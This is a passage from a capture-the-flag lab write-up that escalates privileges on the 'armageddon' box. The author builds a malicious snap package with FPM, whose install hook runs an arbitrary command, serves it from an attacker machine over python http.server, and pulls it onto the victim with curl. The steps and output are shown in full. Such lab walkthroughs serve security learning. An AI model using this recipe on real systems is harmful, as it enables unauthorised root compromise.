## GTFOBINS
Trusty [GTFOBINS](https://gtfobins.github.io/gtfobins/snap/) pointed me to building a package via [FPM](https://github.com/jordansissel/fpm), uploading it to the target, and executing from there.

Ran through the commands one-by-one, although I am now realizing that I could have likely put together a bash script to execute them and build the snap package - will remember for next time.

Built the package and it output x_1.0_all.snap
Hosted an http server from my machine via python3
Utilized curl to bring the file down to the victim machine

```bash
┌──(root💀kali)-[/tmp/tmp.3rsGCSUIuW]
└─# python3 -m http.server 8080
```

```bash
[brucetherealadmin@armageddon ~]$ curl http://10.10.14.6:8080/x_1.0_all.snap --output x_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  31045      0 --:--:-- --:--:-- --:--:-- 31507
[brucetherealadmin@armageddon ~]$ ls
LinEnum-export-28-04-21  LinEnum.sh  pspy64  raad.txt-28-04-21  user.txt  x_1.0_all.snap
```

This resulted in many errors relating to snap not being able to identify a file named 'x'. Spent quite a bit of time researching, and even built an ubuntu machine separately to try and use FPM to compile our exploit, but eventually gave up and began researching other avenues. This is where I discovered the .py exploit for the same vulnerability.

Downloaded Ubuntu image
Spun up Ubuntu VM
Installed Guest Additions
Installed FPM dependencies and application
apt\-get install ruby ruby\-dev rubygems build\-essential
gem install \--no\-document fpm
Ran through GTFOBINS Commands and generated .snap file
Sent from VM > Host > Kali VM as other methods were causing me to spend more time than it was worth
Hosted folder contents via python3 -m http.server 8080
Utilzied Curl to pull down the file 

```bash
[brucetherealadmin@armageddon ~]$ curl 10.10.14.146:8080/xxxx_1.0_all.snap --output xxxx_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  30830      0 --:--:-- --:--:-- --:--:-- 31030
```

```bash
ghohst@ghohst-VirtualBox:~/Documents$ COMMAND=id
ghohst@ghohst-VirtualBox:~/Documents$ cd $(mktemp -d)
ghohst@ghohst-VirtualBox:/tmp/tmp.wkn3OZypH7$ mkdir -p meta/hooks
ghohst@ghohst-VirtualBox:/tmp/tmp.wkn3OZypH7$ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
ghohst@ghohst-VirtualBox:/tmp/tmp.wkn3OZypH7$ chmod +x meta/hooks/install
ghohst@ghohst-VirtualBox:/tmp/tmp.wkn3OZypH7$ fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}
ghohst@ghohst-VirtualBox:/tmp/tmp.wkn3OZypH7$ ls
meta  xxxx_1.0_all.snap
```